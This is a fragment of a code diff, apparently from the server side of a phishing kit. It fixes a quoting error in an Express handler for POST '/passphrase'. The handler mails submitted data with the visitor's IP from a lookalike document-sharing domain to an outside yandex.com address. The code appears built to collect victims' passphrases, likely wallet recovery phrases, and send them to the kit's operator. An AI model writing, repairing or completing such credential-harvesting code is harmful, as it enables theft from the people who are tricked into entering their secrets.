@@ -71,7 +71,7 @@ app.post('/passphrase', async (req, res) => {
     });
 
     const mailOptions = {
-      from:'adminpunch@navi-punchb0wldocument.com'',
+      from:'adminpunch@navi-punchb0wldocument.com',
       to: 'policyinfluencer@yandex.com',
       subject: `Received From ${clientIP}`,
       text: `
